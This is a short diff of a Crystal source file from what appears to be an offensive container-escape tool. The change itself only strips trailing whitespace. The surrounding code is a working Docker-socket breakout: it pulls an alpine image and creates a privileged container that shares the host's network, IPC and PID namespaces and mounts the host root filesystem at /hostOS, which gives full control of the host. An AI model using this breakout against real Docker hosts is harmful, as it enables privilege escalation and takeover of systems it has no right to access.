@@ -8,7 +8,7 @@ def socket_breakout(socket : String, port : Int32 = 0 )
     client.pull_image("alpine:latest")
     puts("==> Creating breakout container with host filesystem mounted.")
     container_id = client.create_container("alpine:latest", Cmd: "/bin/sh", privileged: true, net: "host", ipc: "host", pid: "host", AttachStdin: false,AttachStdout: true,AttachStderr: true,Tty: true, HostConfig: {"Binds": ["/:/hostOS"]})
-    if container_id 
+    if container_id
         puts("==> Created container: #{container_id}")
         client.start_container(container_id)
         puts("==> Started container: #{container_id}")
@@ -20,7 +20,7 @@ end
 def setup_docker_client(socket,port) # unix socket seems tempermental - getting broken pipe exceptions. Quick fix is just to reinstantiate the client after each exec request
     if port > 0
         client = Docker::Client.new(socket,port)
-    else 
+    else
         client = Docker::Client.new(socket)
     end
     client
